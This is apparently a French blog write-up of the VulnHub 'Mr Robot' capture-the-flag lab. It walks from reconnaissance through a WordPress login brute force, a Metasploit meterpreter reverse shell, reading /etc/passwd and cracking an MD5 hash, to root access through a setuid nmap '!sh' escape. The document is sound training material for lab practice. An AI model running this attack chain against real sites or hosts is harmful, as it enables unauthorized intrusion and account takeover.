---
title: VM - Mr Robot
description: "La série Mr Robot est un peu comme la série que l'on attendais tous, celle ou on peut parler d'informatique sans forcement tomber dans les clichés. Le site vulnhub propose un challenge autour du thème de cette série. En voici le writeup"
date: 2016-09-21
image: "/medias/writeups/mr-robot/image.jpeg"
---

La série Mr Robot est un peu comme la série que l'on attendais tous, celle ou on peut parler d'informatique sans forcement tomber dans les clichés. Le site vulnhub propose un challenge autour du thème de cette série.

Le fichier du challenge est téléchargeable ici.
Le fichier .ova se monte tout seul dans virtual box, j'ai volontairement modifié les paramètres réseaux, la VM n'ayant pas besoin d'accès internet.
L'objectif annoncé est de retouver les 3 parties du flag.

## Reconnaissance

Commençons tout d'abord par trouver l'adresse ip de cette machine.
Pour cela un simple ping sweep sur nmap suffit :

```
❯❯❯ nmap -sP 192.168.56.0/24

Starting Nmap 7.12 ( https://nmap.org ) at 2016-09-21 23:34 CEST
Nmap scan report for 192.168.56.1
Host is up (0.00073s latency).
Nmap scan report for 192.168.56.101
Host is up (0.00050s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 3.03 seconds
```

192.168.56.101 est notre victime. Obtenons plus de détails avec un scan plus complet :

```
~ ❯❯❯ nmap -A 192.168.56.101

Starting Nmap 7.12 ( https://nmap.org ) at 2016-09-21 23:39 CEST
Nmap scan report for 192.168.56.101
Host is up (0.00055s latency).
Not shown: 997 filtered ports
PORT STATE SERVICE VERSION
22/tcp closed ssh
80/tcp open http Apache httpd
|\_http-server-header: Apache
|\_http-title: Site doesn't have a title (text/html).
443/tcp open ssl/http Apache httpd
|\_http-server-header: Apache
|\_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|\_Not valid after: 2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.21 seconds

```

Tiens un port 80/443, allons voir par là.
Après une séance de boot simulée nous nous retrouvons face au un prompt qui fonctionne tout seul, on est vraiment dans l'esprit de la série.

La reconnaissance de l'application Web peux se faire via Nikto :

```

~/H/W/n/program ❯❯❯ ./nikto.pl --Display on --host 192.168.56.101

- **\*** SSL support not available (see docs for SSL install) **\***
- Nikto v2.1.6

---

- Target IP: 192.168.56.101
- Target Hostname: 192.168.56.101
- Target Port: 80
- Start Time: 2016-09-21 23:52:54 (GMT2)

---

- Server: Apache
- The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
- The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
- Retrieved x-powered-by header: PHP/5.5.29
- No CGI Directories found (use '-C all' to force check all possible dirs)
- Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
- Uncommon header 'tcn' found, with contents: list
- Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
- OSVDB-3092: /admin/: This might be interesting...
- OSVDB-3092: /readme: This might be interesting...
- Uncommon header 'link' found, with contents: &lt;http://192.168.56.101/?p=23&gt;; rel=shortlink
- /wp-links-opml.php: This WordPress script reveals the installed version.
- OSVDB-3092: /license.txt: License file found may identify site software.
- /admin/index.html: Admin login page/section found.
- Cookie wordpress_test_cookie created without the httponly flag
- /wp-login/: Admin login page/section found.
- /wordpress/: A Wordpress installation was found.
- /wp-admin/wp-login.php: Wordpress login found
- /blog/wp-login.php: Wordpress login found
- /wp-login.php: Wordpress login found
- 7658 requests: 0 error(s) and 18 item(s) reported on remote host
- End Time: 2016-09-21 23:58:06 (GMT2) (312 seconds)

---

- 1 host(s) tested

```

Le programme nous montre qu'un wordpress serait caché sur ce site.
Avant d'aller plus loin sur cette piste concentrons nous sur la présence d'un fichier robots.txt

```
&lt;pre&gt;User-agent: \*
fsocity.dic
key-1-of-3.txt&lt;/pre&gt;
```

Nous voici en présence de la première partie du flag ! Ainsi que d'un fichier .dic contenant plusieures centaines de milliers de lignes :

```

~/C/V/MrRobot01 ❯❯❯ wc -l fsocity.dic
858160 fsocity.dic

```

Ce fichier nous sera utile par la suite.
Nikto nous a remonté la présence d'un wordpress, afin d'obtenir des résultats plus probant nous pouvons utiliser wp-scan qui est un scanner spécialisé dans l'audit de site wordpress :

`` ~/H/W/wpscan ❯❯❯ ./wpscan.rb --url 192.168.56.101 ⏎ ******************************\_\_\_****************************** ** **\_**** **\_** \ \ / / ** \ / \_\_**| \ \ /\ / /| |**) | (\_** **\_ ** \_ \_ ** \ \/ \/ / | \_**/ \_** \ / **|/ _` | '_ \ \ /\ / | | \_**\_) | (**| (_| | | | | \/ \/ |_| |**\_**/ \_**|\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 2.9.1 Sponsored by Sucuri - https://sucuri.net @_WPScan_, @ethicalhack3r, @erwan*lr, pvdl, @\_FireFart* ******************************\_******************************** [+] URL: http://192.168.56.101/ [+] Started: Thu Sep 22 00:04:25 2016 [+] robots.txt available under: 'http://192.168.56.101/robots.txt' [+] Interesting header: SERVER: Apache [+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN [+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523 [+] XML-RPC Interface available under: http://192.168.56.101/xmlrpc.php [+] WordPress version 4.3.1 (Released on 2015-09-15) identified from advanced fingerprinting, rss generator, rdf generator, atom generator, links opml [!] 14 vulnerabilities identified from the version number .... ``

Les 14 vulnérabilités proposées par wpscan sont peut exploitables.
Par contre, wordpress 4.3.1 est sensible au bruteforce.

## Le Wordpress

### Trouver l'utilisateur

Rendons nous sur la page /wp-login.php
Celle ci nous demande une authentification, sur cette version de wordpress il est possible d'énumérer la liste des utilisateurs existant. En effet si le login d'un utilisateur existant est testé, et ce meme avec un mot de passe faux, le message d'erreur sera différent de celui d'un utilisateur n'existant pas.

En partant de ce fait, j'ai écrit un script python qui bruteforce la liste des utilisateurs existant sur le wordpress, le script en question est disponible ici.

```

~/H/W/W/WordpressLoginBruteforcer ❯❯❯ python2 script.py --url "http://192.168.56.101/wp-login.php" --false "Invalid username" --wordlist "/home/shoxx/CTF/VulnHub/MrRobot01/fsocity.dic" ⏎
Found a valid login with : Elliot

```

Elliot, comme le personnage principal de la série.

### Trouver le mot de passe

En utilisant le meme principe, il ne me restais plus qu'à coder un script pour bruteforcer le mot de passe.
Ce dernier est disponible ici.

```

python2 script.py --url "http://192.168.56.101/wp-login.php" --false "The password you entered for the username" --wordlist "/home/shoxx/CTF/VulnHub/MrRobot01/fsocity.dic" -v -l "Elliot"
```

Une fois terminé le script nous donne le mot de passe suivant :  ER28-0652

Road to shell

Une fois authentifié sur le wordpress on remarque que l'utilisateur que nous controlons (Elliot) est administrateur du blog. Ceci va nous permettre d'obtenir un shell sur la machine.
L'utilisateur admin ayant le droit d'uploader des plugins, on vas pouvoir uploader un shell.

Pour ceci on peut sortir metasploit :

```

msf &gt; use exploit/unix/webapp/wp_admin_shell_upload

msf exploit(wp_admin_shell_upload) &gt; show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

Name Current Setting Required Description

---

PASSWORD ER28-0652 yes The WordPress password to authenticate with
Proxies no A proxy chain of format type:host:port[,type:host:port][...]
RHOST 192.168.56.101 yes The target address
RPORT 80 yes The target port
SSL false no Negotiate SSL/TLS for outgoing connections
TARGETURI / yes The base path to the wordpress application
USERNAME Elliot yes The WordPress username to authenticate with
VHOST no HTTP server virtual host
Payload options (php/meterpreter/reverse_tcp):

Name Current Setting Required Description

---

LHOST 192.168.56.101 yes The listen address
LPORT 4444 yes The listen port
Exploit target:

Id Name

---

0 WordPress

msf exploit(wp_admin_shell_upload) &gt; exploit

[*] Started reverse TCP handler on 192.168.56.1:4444
[*] Authenticating with WordPress using Elliot:ER28-0652...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/gSmqOhbMXe/xzchmLrTQw.php...
[*] Sending stage (33721 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.1:4444 -&gt; 192.168.56.101:45840) at 2016-09-22 00:29:23 +0200
[!] This exploit may require manual cleanup of 'xzchmLrTQw.php' on the target
[!] This exploit may require manual cleanup of 'gSmqOhbMXe.php' on the target

meterpreter &gt;

```

And voila un shell !

## Got Root ?

Nous voici avec un shell sur la machine, première étape, lister les utilisateurs présent.

```

meterpreter &gt; shell
Process 2154 created.
Channel 1 created.
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)

```

Un utilisateur robot existe, allons voir les fichiers de ce dernier :

```

ls -la /home/robot
total 16
drwxr-xr-x 2 root root 4096 Nov 13 2015 .
drwxr-xr-x 3 root root 4096 Nov 13 2015 ..
-r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5

```

La seconde clef est ici, mais seul robot peut lire ce fichier. Par contre password.raw-md5 est accessible à tous.

```

cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

```

Une fois "Googlelé" cette chaine md5 est en réalité : "abcdefghijklmnopqrstuvwxyz".
Tentons de nous logger :

```su robot
su: must be run from a terminal
```

Avant de pouvoir aller plus loin, il nous faut un shell dans un tty pour que su puisse fonctionner.
Après quelques secondes de recherche sur Pentest Monkey la chaîne suivante nous permet, en python, d'obtenir un shell dans un pseudo tty.

```

python -c "import pty; pty.spawn('/bin/bash')"
&lt;ps/wordpress/htdocs/wp-content/plugins/gSmqOhbMXe$

```

On peux maintenant se logger avec l'utilisateur robot et lire la seconde partie du flag.

## Got Root !

Le fichier contenant la 3eme partie du flag appartient à root. L'objectif est donc clair, obtenir un shell root pour terminer l'épreuve.
Pour cela on commence par chercher les binaires setuid root :

```

&lt;tent/plugins/gSmqOhbMXe$ find / -user root -perm -4000 -print
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
find: `/etc/ssl/private': Permission denied
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown

```

Tiens, le binaire nmap est setuid root !
Heureusement pour nous, nmap dispose d'une fonction lui permettant d'offrir un shell, ce qui siginifie pour nous, obtenir un shell root.

```

&lt;ps/wordpress/htdocs/wp-content/plugins/gSmqOhbMXe$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h &lt;enter&gt; for help
nmap&gt; !sh
!sh

# id

id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)

# ls -la /root

ls -la /root
total 32
drwx------ 3 root root 4096 Nov 13 2015 .
drwxr-xr-x 22 root root 4096 Sep 16 2015 ..
-rw------- 1 root root 4058 Nov 14 2015 .bash_history
-rw-r--r-- 1 root root 3274 Sep 16 2015 .bashrc
drwx------ 2 root root 4096 Nov 13 2015 .cache
-rw-r--r-- 1 root root 0 Nov 13 2015 firstboot_done
-r-------- 1 root root 33 Nov 13 2015 key-3-of-3.txt
-rw-r--r-- 1 root root 140 Feb 20 2014 .profile
-rw------- 1 root root 1024 Sep 16 2015 .rnd

```

And voila ! Nous sommes root sur la machine !

## Conclusion

Avec du recul, il n'était pas nécessaire de coder des scripts qui bruteforcent le wordpress, il existe des modules metasploit qui font ceci, un outil comme Burp peut aussi faire l'affaire.
Ce petit challenge est très simple et assez accessible, l’environnement est fidèle à l'esprit de la série, même si on peux regretter le manque de reverse/exploitation
